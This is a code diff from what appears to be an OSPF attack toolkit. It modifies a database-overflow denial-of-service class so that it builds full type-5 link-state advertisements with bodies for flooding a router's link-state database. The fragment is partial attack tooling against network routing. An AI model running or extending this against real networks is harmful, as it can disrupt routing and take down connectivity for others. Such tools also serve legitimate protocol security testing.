@@ -1,7 +1,7 @@
 import ipaddress
 from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
 from ospf_attack.config.types import DoSConfig
-from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
+from ospf_attack.core.packet import build_lsu_packet, build_lsa_with_body, OSPF_MULTICAST_ALL
 from ospf_attack.network.sender import PacketSender
 
 
@@ -22,7 +22,7 @@ class DBOverflowAttack(BaseAttack):
         base_net = 0x0A000000
         for i in range(self.config.lsa_count):
             lsid = str(ipaddress.IPv4Address(base_net + (i << 8)))
-            lsa = build_lsa_header(
+            lsa = build_lsa_with_body(
                 lsa_type=5, link_state_id=lsid,
                 advertising_router=self.config.router_id, sequence=0x80000001, age=0,
             )
